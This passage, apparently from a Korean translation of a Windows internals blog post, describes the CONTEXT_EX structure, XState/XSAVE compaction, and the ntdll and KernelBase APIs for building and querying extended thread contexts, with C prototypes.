&#xD06C;&#xAE30;&#xAC00; &#xB354; &#xC791;&#xC744; &#xC218; &#xC788;&#xC74C;) <code>All</code> &#xD544;&#xB4DC;&#xB294; &#xAE30;&#xC874; CONTEXT &#xAD6C;&#xC870;&#xC758; &#xC2DC;&#xC791;&#xC744; &#xCC38;&#xC870;&#xD558;&#xC9C0;&#xB9CC; Length&#xB294; CONTEXT_EX&#xC640; XSAVE &#xC601;&#xC5ED;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xD328;&#xB529;/&#xC815;&#xB82C; &#xACF5;&#xAC04;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xC5EC; &#xBAA8;&#xB4E0; &#xB370;&#xC774;&#xD130;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xB098;&#xD0C0;&#xB0B8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; <code>XState</code> &#xD544;&#xB4DC;&#xB294; <code>XSAVE_AREA_HEADER</code> &#xAD6C;&#xC870; (&#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xB294; &#xC0C1;&#xD0DC; &#xB9C8;&#xC2A4;&#xD06C;&#xB97C; &#xC815;&#xC758;&#xD568;)&#xC640; &#xC804;&#xCCB4; XSAVE &#xC601;&#xC5ED;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xCC38;&#xC870;&#xD55C;&#xB2E4;. &#xC774; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC73C;&#xB85C; &#xC778;&#xD574; All &#xBC0F; Legacy&#xC5D0;&#xB294; &#xC74C;&#xC218; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;&#xB294; &#xC810;&#xC5D0; &#xC720;&#xC758;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xAE30;&#xB2A5;&#xC774; &#xB9E4;&#xC6B0; &#xBCF5;&#xC7A1;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>Ntdll.dll</code>&#xC740; CONTEXT_EX&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB2E4;&#xC591;&#xD55C; &#xB370;&#xC774;&#xD130;&#xC758; &#xBE4C;&#xB4DC;, &#xC77D;&#xAE30;, &#xBCF5;&#xC0AC; &#xBC0F; &#xC870;&#xC791;&#xC744; &#xB2E8;&#xC21C;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB2E4;&#xC591;&#xD55C; API&#xB97C; export &#xD55C;&#xB2E4;. (&#xC774;&#xB7EC;&#xD55C; API &#xC911; &#xC77C;&#xBD80;&#xB294; <code>Ntoskrn.exe</code> &#xC5D0;&#xC11C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xC9C0;&#xB9CC; export &#xB418;&#xC9C0;&#xB294; &#xC54A;&#xB294;&#xB2E4;.) &#xB610;&#xD55C; <code>KernelBase.dll</code>&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBB38;&#xC11C;&#xD654;&#xB41C; Win32 &#xD568;&#xC218;&#xB97C; export &#xD55C;&#xB2E4;.</p><h2 id="CONTEXT-EX-&#xCD08;&#xAE30;&#xD654;"><a href="#CONTEXT-EX-&#xCD08;&#xAE30;&#xD654;" class="headerlink" title="CONTEXT_EX &#xCD08;&#xAE30;&#xD654;"></a>CONTEXT_EX &#xCD08;&#xAE30;&#xD654;</h2><p>&#xBA3C;&#xC800; &#xD638;&#xCD9C;&#xC790;&#xB294; CONTEXT_EX&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD560;&#xB2F9;&#xD560; &#xBA54;&#xBAA8;&#xB9AC; &#xD06C;&#xAE30;&#xB97C; &#xD30C;&#xC545;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774;&#xB294; &#xB2E4;&#xC74C; API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs c">NTSYSAPIULONGNTAPIRtlGetExtendedContextLength (    _In_ ULONG ContextFlags,    _Out_ PULONG ContextLength);</code></pre><p>&#xD638;&#xCD9C;&#xC790;&#xB294; &#xC800;&#xC7A5;&#xD560; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC801;&#xC808;&#xD55C; <code>CONTEXT_XXX</code> &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC81C;&#xACF5;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C;&#xC774; API&#xB294; <code>SharedUserData.XState.EnabledFeatures</code> &#xBC0F; <code>SharedUserData.XState.EnabledUserVisibleSupervisorFeatures</code> &#xB97C; &#xC77D;&#xACE0; &#xBAA8;&#xB4E0; &#xBE44;&#xD2B8;&#xB97C; &#xD1B5;&#xD569;&#xD574; &#xC544;&#xB798;&#xC758; &#xD655;&#xC7A5; &#xD568;&#xC218;&#xB85C; &#xC804;&#xB2EC;&#xD55C;&#xB2E4;.</p><pre><code class="hljs c">NTSYSAPIULONGNTAPIRtlGetExtendedContextLength2 (    _In_ ULONG ContextFlags,    _Out_ PULONG ContextLength,    _In_ ULONG64 XStateCompactionMask);</code></pre><p>&#xC774; &#xCD5C;&#xC2E0; API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xACF5;&#xC720; &#xC0AC;&#xC6A9;&#xC790; &#xB370;&#xC774;&#xD130;&#xC758; XState &#xAD6C;&#xC131;&#xC5D0;&#xC11C; &#xBAA8;&#xB4E0; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xAE30;&#xB2A5;&#xC744; &#xAC00;&#xC838;&#xC624;&#xB294; &#xB300;&#xC2E0; &#xC2E4;&#xC81C;&#xB85C; &#xC800;&#xC7A5;&#xD560; XState &#xC0C1;&#xD0DC;&#xB97C; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; CONTNENT_EX &#xAD6C;&#xC870;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xC791;&#xC544;&#xC838; &#xBAA8;&#xB4E0; XState &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD560; &#xACF5;&#xAC04;&#xC774; &#xCDA9;&#xBD84;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB418;&#xBBC0;&#xB85C; &#xC774; CONTNT_EX&#xB97C; &#xB098;&#xC911;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC9C0;&#xC815;&#xB41C; &#xB9C8;&#xC2A4;&#xD06C; &#xC678;&#xBD80;&#xC5D0;&#xC11C; XState Bits&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xC790;&#xB294; CONTEXT_EX&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; (&#xB300;&#xBD80;&#xBD84;&#xC758; &#xACBD;&#xC6B0; Windows&#xB294; &#xC608;&#xC678; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xC2E4;&#xD328;&#xB97C; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; <code>alloca</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.) &#xB2E4;&#xC74C; &#xB450; API &#xC911; &#xD558;&#xB098;&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.</p><pre><code class="hljs c">NTSYSAPIULONGNTAPIRtlInitializeExtendedContext (    _Out_ PVOID Context,    _In_ ULONG ContextFlags,    _Out_ PCONTEXT_EX* ContextEx);NTSYSAPIULONGNTAPIRtlInitializeExtendedContext2 (    _Out_ PVOID Context,    _In_ ULONG ContextFlags,    _Out_ PCONTEXT_EX* ContextEx,    _In_ ULONG64 XStateCompactionMask);</code></pre><p>&#xC774;&#xC804;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xCD5C;&#xC2E0; API&#xC5D0;&#xC11C;&#xB294; &#xC555;&#xCD95;&#xB41C; &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xD560; XState &#xC0C1;&#xD0DC;&#xB97C; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC9C0;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5; (<code>SharedUserData</code> &#xAE30;&#xBC18;)&#xC774; &#xC788;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xB41C;&#xB2E4;.  &#xD638;&#xCD9C;&#xC790;&#xB294; <code>RtlGetExtendedContextLength(2)</code>&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xCD9C;&#xACFC; &#xB3D9;&#xC77C;&#xD55C; <code>ContextFlags</code>&#xB97C; &#xC9C0;&#xC815;&#xD574; &#xCF58;&#xD14D;&#xC2A4;&#xD2B8; &#xAD6C;&#xC870;&#xAC00; &#xC62C;&#xBC14;&#xB978; &#xD06C;&#xAE30;&#xB85C; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC774;&#xD6C4; &#xD638;&#xCD9C;&#xC790;&#xB294; &#xC785;&#xB825; CONTEXT &#xBC84;&#xD37C;&#xB97C; &#xB530;&#xB77C;&#xAC08; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xB418;&#xB294; CONTEXT_EX &#xAD6C;&#xC870;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC1B;&#xB294;&#xB2E4;.</p><p>CONTEXT_EX&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA74; &#xD638;&#xCD9C;&#xC790;&#xB294; &#xBA3C;&#xC800; &#xB808;&#xAC70;&#xC2DC; CONTEXT &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC838;&#xC62C; &#xC218; &#xC788;&#xB2E4;. (&#xD06C;&#xAE30;&#xC5D0; &#xB300;&#xD55C; &#xAC00;&#xC815; &#xC5C6;&#xC774;). &#xB2E4;&#xC74C; API&#xB85C; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs c">NTSYSAPIPCONTEXTNTAPIRtlLocateLegacyContext (    _In_ PCONTEXT_EX ContextEx,    _Out_opt_ PULONG Length,);</code></pre><p>&#xADF8;&#xB7EC;&#xB098; &#xC774;&#xC804;&#xC5D0; &#xC5B8;&#xAE09;&#xD588;&#xB4EF;&#xC774; &#xC774;&#xB4E4;&#xC740; Windows&#xC758; NT &#xACC4;&#xCE35;&#xC5D0; &#xC758;&#xD574; &#xB178;&#xCD9C;&#xB418;&#xB294; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB0B4;&#xBD80; API&#xB2E4;. &#xC77C;&#xBC18;&#xC801;&#xC778; Win32 &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xB2E4;&#xC74C; &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; XState &#xD638;&#xD658; CONTEXT &#xAD6C;&#xC870;&#xC758; &#xC0AC;&#xC6A9;&#xC744; &#xB2E8;&#xC21C;&#xD654;&#xD55C;&#xB2E4;.</p><pre><code class="hljs c">WINBASEAPIBOOLWINAPIInitializeContext (    _Out_writes_bytes_opt_(*ContextLength) PVOID Context,    _In_ DWORD ContextFlags,    _Out_ PCONTEXT_EX Context,    _Inout_ PDWORD ContextFlags);WINBASEAPIBOOLWINAPIInitializeContext2 (    _Out_writes_bytes_opt_(*ContextLength) PVOID Context,    _In_ DWORD ContextFlags,    _Out_ PCONTEXT_EX Context,    _Inout_ PDWORD ContextFlags,    _In_ ULONG64 XStateCompactionMask);</code></pre><p>&#xC774; &#xB450; API&#xB294; &#xBB38;&#xC11C;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; API&#xC640; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; &#xC791;&#xB3D9;&#xD55C;&#xB2E4;. &#xD638;&#xCD9C;&#xC790;&#xAC00; Buffer &#xBC0F; Context &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB85C; &#xCC98;&#xC74C; NULL&#xC744; &#xC804;&#xB2EC;&#xD558;&#xBA74; &#xD568;&#xC218;&#xB294; <code>ContextLength</code>&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xAE38;&#xC774;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA70; &#xD638;&#xCD9C;&#xC790;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xD560;&#xB2F9;&#xD55C;&#xB2E4;. &#xB450; &#xBC88;&#xC9F8; &#xC2DC;&#xB3C4;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xC790;&#xB294; &#xD560;&#xB2F9;&#xB41C; &#xD3EC;&#xC778;&#xD130;&#xB97C; Buffer&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xACE0; &#xAE30;&#xBCF8; CONTEXT_EX &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4; &#xC5C6;&#xC774; Context&#xC758; CONTEXT &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC1B;&#xB294;&#xB2E4;.</p><h2 id="CONTEXT-EX&#xC5D0;&#xC11C;-XState-&#xAE30;&#xB2A5;-&#xB9C8;&#xC2A4;&#xD06C;-&#xC81C;&#xC5B4;"><a href="#CONTEXT-EX&#xC5D0;&#xC11C;-XState-&#xAE30;&#xB2A5;-&#xB9C8;&#xC2A4;&#xD06C;-&#xC81C;&#xC5B4;" class="headerlink" title="CONTEXT_EX&#xC5D0;&#xC11C; XState &#xAE30;&#xB2A5; &#xB9C8;&#xC2A4;&#xD06C; &#xC81C;&#xC5B4;"></a>CONTEXT_EX&#xC5D0;&#xC11C; XState &#xAE30;&#xB2A5; &#xB9C8;&#xC2A4;&#xD06C; &#xC81C;&#xC5B4;</h2><p>CONTEXT_EX&#xC758; <code>XSAVE_AREA_HEADER</code>&#xC758; Mask &#xD544;&#xB4DC;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>XSTATE_BV</code> (&#xD655;&#xC7A5; &#xAE30;&#xB2A5; &#xB9C8;&#xC2A4;&#xD06C;)&#xC5D0; &#xC561;&#xC138;&#xC2A4; &#xD558;&#xAE30; &#xC704;&#xD574; &#xC2DC;&#xC2A4;&#xD15C;&#xC740;  XState &#xB9C8;&#xC2A4;&#xD06C;&#xB97C; &#xC218;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD55C; API&#xC640; &#xD568;&#xAED8; CONTEXT_EX&#xC5D0;&#xC11C; &#xC5B4;&#xB5A4; XState &#xAE30;&#xB2A5;&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xC27D;&#xAC8C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xB450; &#xAC1C;&#xC758; API&#xB97C; export &#xD55C;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; Windows&#xB294; XSAVE &#xC601;&#xC5ED;&#xC5D0; x87 FPU (0) &#xBC0F; SSE (1) &#xC0C1;&#xD0DC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xB300;&#xC2E0; <code>FXSAVE</code> &#xBA85;&#xB839;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. &#xC989;, XSAVE &#xC601;&#xC5ED;&#xC5D0; &#xB808;&#xAC70;&#xC2DC; &#xC601;&#xC5ED;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC9C0; &#xC54A;&#xACE0; &#xC989;&#xC2DC; <code>XSAVE_AREA_HEADER</code>&#xB85C; &#xC2DC;&#xC791;&#xB41C;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; Get API&#xB294; &#xD56D;&#xC0C1; &#xD558;&#xC704; 2 &#xBE44;&#xD2B8;&#xB97C; &#xB9C8;&#xC2A4;&#xD0B9;&#xD55C;&#xB2E4;. &#xB610;&#xD55C; Set API&#xB294; &#xC9C0;&#xC815;&#xB41C; &#xAE30;&#xB2A5;&#xC774; XState &#xAD6C;&#xC131;&#xC758; <code>EnabledFeatures</code>&#xC5D0; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</p><p><code>InitializeContext2</code>(&#xB610;&#xB294; &#xB0B4;&#xBD80; &#xB124;&#xC774;&#xD2F0;&#xBE0C; APIs)&#xC5D0;&#xC11C; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xC555;&#xCD95; &#xB9C8;&#xC2A4;&#xD06C;&#xAC00; &#xC9C0;&#xC815;&#xB41C; &#xACBD;&#xC6B0; Set API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAE30;&#xC874; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xB97C; &#xC0DD;&#xB7B5;&#xD574;&#xC11C;&#xB294; &#xC548;&#xB41C;&#xB2E4;. (&#xC0C8; &#xBE44;&#xD2B8;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xBA74; CONTEXT_EX&#xC5D0; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xCD94;&#xAC00; &#xC0C1;&#xD0DC; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xBBC0;&#xB85C; &#xC774; &#xB370;&#xC774;&#xD130; &#xC5C6;&#xC774; &#xC774;&#xBBF8; &#xC0AC;&#xC804; &#xD560;&#xB2F9;&#xB418;&#xC5C8;&#xC744; &#xAC83;&#xC774;&#xB2E4;.)</p><pre><code class="hljs c">NTSYSAPIULONG64NTAPIRtlGetExtendedFeaturesMask (    _In_ PCONTEXT_EX ContextEx);NTSYSAPIULONG64NTAPIRtlSetExtendedFeaturesMask (    _In_ PCONTEXT_EX ContextEx,    _In_ ULONG64 FeatureMask);</code></pre><p>&#xC704; API&#xC758; &#xBB38;&#xC11C;&#xD654;&#xB41C; &#xD615;&#xC2DD;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs c">WINBASEAPIBOOLWINAPIGetXStateFeaturesMask (    _In_ PCONTEXT Context    _Out_ PDWORD64 FeatureMask);NTSYSAPIULONG64NTAPISetXStateFeaturesMask (    _In_ PCONTEXT Context,    _In_ DWORD64 FeatureMask);</code></pre><h2 id="CONTEXT-EX&#xC5D0;&#xC11C;-XState-&#xAE30;&#xB2A5;-&#xCC3E;&#xAE30;"><a href="#CONTEXT-EX&#xC5D0;&#xC11C;-XState-&#xAE30;&#xB2A5;-&#xCC3E;&#xAE30;" class="headerlink" title="CONTEXT_EX&#xC5D0;&#xC11C; XState &#xAE30;&#xB2A5; &#xCC3E;&#xAE30;"></a>CONTEXT_EX&#xC5D0;&#xC11C; XState &#xAE30;&#xB2A5; &#xCC3E;&#xAE30;</h2><p>CONTEXT_EX &#xAD6C;&#xC870;&#xC758; &#xBCF5;&#xC7A1;&#xC131;&#xACFC; XState &#xAE30;&#xB2A5;&#xC774; &#xC555;&#xCD95;&#xB418;&#xAC70;&#xB098; &#xC555;&#xCD95;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD615;&#xD0DC;&#xB85C; &#xC874;&#xC7AC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC874;&#xC7AC; &#xC5EC;&#xBD80;&#xB3C4; &#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xB2E4;&#xC591;&#xD55C; &#xC0C1;&#xD0DC; &#xB9C8;&#xC2A4;&#xD06C;&#xC5D0; &#xC758;&#xC874;&#xD55C;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4; (&#xD2B9;&#xD788; &#xCD5C;&#xC801;&#xD654;&#xB41C; XSAVE&#xAC00; &#xC9C0;&#xC6D0;&#xB418;&#xB294; &#xACBD;&#xC6B0;)&#xB85C; &#xC778;&#xD574;, &#xD638;&#xCD9C;&#xC790;&#xB294; CONTEXT_EX &#xB0B4;&#xC758; XSAVE &#xC601;&#xC5ED;&#xC5D0;&#xC11C; &#xAD00;&#xB828; &#xC0C1;&#xD0DC; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC27D;&#xACE0; &#xBE60;&#xB974;&#xAC8C; &#xC5BB;&#xAE30; &#xC704;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD568;&#xC218;&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;.</p><p>&#xD604;&#xC7AC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB450; &#xAC00;&#xC9C0; &#xD568;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;. <code>RtlLocateExtendedFeature</code>&#xB294; <code>RtlLocateExtendedFeature2</code>&#xC758; wrapper&#xC774;&#xBA70; &#xAD6C;&#xC131; &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB85C; <code>SharedUserData.XState</code>&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC81C;&#xACF5;&#xD55C;&#xB2E4;. &#xB450; &#xD568;&#xC218; &#xBAA8;&#xB450; export &#xD560; &#xB54C; &#xD638;&#xCD9C;&#xC790;&#xAC00; &#xC120;&#xD0DD;&#xD55C; &#xACBD;&#xC6B0; &#xD6C4;&#xC790;&#xC758; API&#xC5D0;&#xC11C; &#xC790;&#xCCB4; &#xC0AC;&#xC6A9;&#xC790; &#xC9C0;&#xC815; XState &#xAD6C;&#xC131;&#xC744; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xC9C0;&#xC815;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.</p><pre><code class="hljs c">NTSYSAPIPVOIDNTAPIRtlLocateExtendedFeature (    _In_ CONTEXT_EX ContextEx,    _In_ ULONG FeatureId,    _Out_opt_ PULONG Length);NTSYSAPIPVOIDNTAPIRtlLocateExtendedFeature2 (    _In_ CONTEXT_EX ContextEx,    _In_ ULONG FeatureId,    _In_ PXSTATE_CONFIGURATION Configuration,    _Out_opt_ PULONG Length);</code></pre><p>&#xB450; &#xD568;&#xC218; &#xBAA8;&#xB450; CONTEXT_EX &#xAD6C;&#xC870;&#xC640; &#xC694;&#xCCAD;&#xB41C; &#xAE30;&#xB2A5;&#xC758; ID&#xB97C; &#xC218;&#xC2E0;&#xD558;&#xACE0; &#xAE30;&#xB2A5;&#xC774; XSAVE &#xC601;&#xC5ED;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC704;&#xCE58;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xAE30; &#xC704;&#xD574; XState &#xAD6C;&#xC131; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAD6C;&#xBB38; &#xBD84;&#xC11D;&#xD55C;&#xB2E4;. &#xC9C0;&#xC815;&#xB41C; &#xAE30;&#xB2A5;&#xC5D0; &#xB300;&#xD55C; &#xC2E4;&#xC81C; &#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098; &#xBC18;&#xD658;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA70; &#xC774;&#xB294; &#xD638;&#xCD9C;&#xC790;&#xC5D0;&#xAC8C; &#xB2EC;&#xB824; &#xC788;&#xB2E4;.</p><p>&#xD3EC;&#xC778;&#xD130;&#xB97C; &#xCC3E;&#xAE30; &#xC704;&#xD574; <code>RtlLocateExtendedFeature2</code>&#xB294; &#xB2E4;&#xC74C;&#xC744; &#xC218;&#xD589;&#xD55C;&#xB2E4;:</p><ul><li>&#xAE30;&#xB2A5; ID&#xAC00; 2 &#xC774;&#xC0C1; (x87 FPU &#xBC0F; SSE &#xC0C1;&#xD0DC;&#xB294; Windows&#xC758; XSAVE&#xB97C; &#xD1B5;&#xD574; &#xC800;&#xC7A5;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C;) &#xBC0F; 64 (&#xAC00;&#xB2A5;&#xD55C; &#xAC00;&#xC7A5; &#xB192;&#xC740; XState &#xAE30;&#xB2A5; &#xBE44;&#xD2B8;) &#xBBF8;&#xB9CC;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</li><li>CONTEXT_EX + <code>CONTEXT_EX.XState.Offset</code>&#xC5D0;&#xC11C; <code>XSAVE_AREA_HEADER</code>&#xB97C; &#xAC00;&#xC838;&#xC628;&#xB2E4;.</li><li><code>Configuration</code>-&gt; <code>ControlFlags.CompactionEnabled</code> &#xD50C;&#xB798;&#xADF8;&#xC5D0;&#xC11C; &#xC555;&#xCD95;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</li><li>&#xC555;&#xCD95;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD615;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0; :<ul><li><code>Configuration</code>-&gt; <code>Features[n].Offset</code> &#xBC0F; <code>.Size</code>&#xB97C; &#xC77D;&#xACE0; XSAVE &#xC601;&#xC5ED;&#xC5D0;&#xC11C; &#xC694;&#xCCAD;&#xB41C; &#xAE30;&#xB2A5;&#xC758; &#xC624;&#xD504;&#xC14B; &#xBC0F; &#xD06C;&#xAE30;&#xB97C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;.</li></ul></li><li>&#xC555;&#xCD95;&#xB41C; &#xD615;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0; :<ul><li><code>XSAVE_AREA_HEADER</code> (<code>XCOMP_BV</code>&#xC5D0; &#xD574;&#xB2F9;)&#xC5D0;&#xC11C; <code>CompactionMask</code>&#xB97C; &#xC77D;&#xACE0; &#xC694;&#xCCAD;&#xB41C; &#xAE30;&#xB2A5;&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</li><li><code>Configuration</code>-&gt; <code>AllFeatures</code>&#xB97C; &#xC77D;&#xACE0; &#xC0C1;&#xD0DC; &#xBE44;&#xD2B8;&#xAC00; &#xC694;&#xCCAD;&#xB41C; &#xAE30;&#xB2A5; ID &#xC55E;&#xC5D0; &#xC624;&#xB294; &#xBAA8;&#xB4E0; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xC0C1;&#xD0DC;&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xC774;&#xB7EC;&#xD55C; &#xD06C;&#xAE30;&#xB97C; &#xB354;&#xD558;&#xC5EC; &#xC694;&#xCCAD;&#xB41C; &#xD615;&#xC2DD;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACC4;&#xC0B0;&#xD55C; &#xB4A4; &#xAC01; &#xC774;&#xC804; &#xC0C1;&#xD0DC; &#xC601;&#xC5ED;&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC744; 64byte&#xB85C; &#xC815;&#xB82C;&#xD55C;&#xB2E4;. &#xD574;&#xB2F9; &#xBE44;&#xD2B8;&#xAC00; <code>Configuration</code>-&gt; <code>AlignedFeatures</code>&#xC5D0; &#xC124;&#xC815;&#xB41C; &#xACBD;&#xC6B0; &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xD544;&#xC694;&#xD55C; &#xACBD;&#xC6B0; &#xC9C0;&#xC815;&#xB41C; &#xAE30;&#xB2A5; ID&#xC5D0; &#xB300;&#xD55C; &#xC601;&#xC5ED;&#xC758; &#xC2DC;&#xC791;&#xC744; &#xC815;&#xB82C;&#xD55C;&#xB2E4;.</li><li><code>Configuration.AllFeatures[n]</code>&#xC5D0;&#xC11C; &#xC694;&#xCCAD;&#xB41C; 